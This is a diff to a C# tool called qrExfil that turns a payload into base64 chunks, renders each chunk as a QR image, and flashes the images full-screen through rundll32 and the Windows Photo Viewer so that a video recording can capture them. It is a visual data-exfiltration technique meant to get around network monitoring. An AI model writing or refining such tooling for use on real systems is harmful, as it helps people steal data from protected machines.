@@ -14,6 +14,9 @@ using System.Diagnostics;
 using System.Collections.Generic;
 using static System.IO.File;
 using static System.Environment;
+using System.Text;
+using System.Runtime.InteropServices;
+using System.Threading;
 
 namespace qrExfil
 {
@@ -24,22 +27,17 @@ namespace qrExfil
 
     public static class Qrex
     {
-        static void DisplayImage(string filename)
+        static async void OpenImage(string imagePath, int time)
         {
-            OperatingSystem os = Environment.OSVersion;
-            bool isWindows = $"{os}".Contains("Windows");
-            if (isWindows == true)
-            {
-                using Process photoViewer = new Process();
-                photoViewer.StartInfo.FileName = $"{filename}";
-                Console.WriteLine($"[*] Displaying picture {filename}");
-                photoViewer.Start();
-            }
-            else
-            {
-                Console.WriteLine("Not running windows. Exiting.");
-                Exit(500);
-            }
+            Process photoViewer = new Process();
+            photoViewer.StartInfo.FileName = "c:\\windows\\system32\\rundll32.exe ";
+            photoViewer.StartInfo.Arguments = "\"c:\\program files\\windows photo viewer\\photoviewer.dll\",ImageView_Fullscreen " + imagePath;
+            photoViewer.Start();
+
+            Thread.Sleep(time * 500); // Lets wait for the video to record the code, 1s or 0.5s should do it
+
+            photoViewer.Kill();
+            photoViewer.Close();
         }
 
         static void SaveImage(string encoded, int idx)
@@ -59,7 +57,9 @@ namespace qrExfil
             ms.WriteTo(file);
             file.Close();
             ms.Close();
-            Globals.fileList.Add(filename);
+            string filepath = Environment.CurrentDirectory + "\\" + filename;
+            Console.WriteLine($"[*] Added {filename}");
+            Globals.fileList.Add(filepath);
         }
 
         static void EncodePayload(string payload)
@@ -79,7 +79,7 @@ namespace qrExfil
                     {
                         //Console.WriteLine("\t[*] Encoding chunk #{0} of {1} bytes", 0, bytesRead);
                         encoded = Convert.ToBase64String(new byte[600]);
-                        encodedList.Add(new KeyValuePair<string, int>(encoded, 0));
+                        encodedList.Add(new KeyValuePair<string, int>(encoded, i));
                         i++;
                     }
                     Console.WriteLine("[*] End of encoding");
@@ -130,9 +130,8 @@ namespace qrExfil
             }
             foreach (string file in Globals.fileList)
             {
-                //Console.WriteLine($">> {file}");
-                DisplayImage(file.ToString());
-                System.Threading.Thread.Sleep(50); // 50msec between pics 
+                Console.WriteLine($">> {file}");
+                OpenImage(file, 1);
             }
             return 0;
         }
